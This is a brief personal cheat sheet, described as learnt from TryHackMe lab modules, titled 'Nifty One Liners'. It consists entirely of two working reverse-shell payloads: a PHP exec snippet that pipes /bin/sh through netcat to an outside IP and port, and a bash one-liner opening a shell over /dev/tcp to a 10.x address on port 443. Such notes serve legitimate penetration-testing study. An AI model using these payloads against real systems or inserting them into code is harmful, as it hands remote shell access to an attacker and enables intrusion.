---
description: Learnt on Tryhackme modules
---

# Nifty One Liners

**PHP Reverse netcat**

```
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

**Reverse Bash**

```
bash -i >& /dev/tcp/10.x.x.x/443 0>&1
```

Where 443 is the port
